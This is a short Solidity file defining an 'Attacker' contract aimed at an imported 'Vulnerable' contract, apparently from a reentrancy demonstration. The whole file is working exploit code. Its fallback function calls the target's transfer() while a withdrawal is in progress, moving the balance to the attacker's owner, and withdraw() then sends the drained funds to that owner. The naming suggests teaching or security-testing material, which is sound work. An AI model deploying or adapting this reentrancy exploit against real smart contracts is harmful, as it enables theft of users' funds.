pragma solidity >=0.4.21 <0.6.0;

import "./Vulnerable.sol";

contract Attacker {
  address payable private _owner;
  Vulnerable private _vulnerable;

  modifier onlyOwner {
    require(msg.sender == _owner);
    _;
  }

  constructor(address vulnerable) public {
    _owner = msg.sender;
    _vulnerable = Vulnerable(vulnerable);
  }

  function () payable external {
    _vulnerable.transfer(_owner, msg.value);
  }

  function deposit() payable public onlyOwner {
    _vulnerable.deposit.value(msg.value)();
  }

  function withdraw() public onlyOwner {
    _vulnerable.withdraw();
    _owner.transfer(address(this).balance);
  }
}
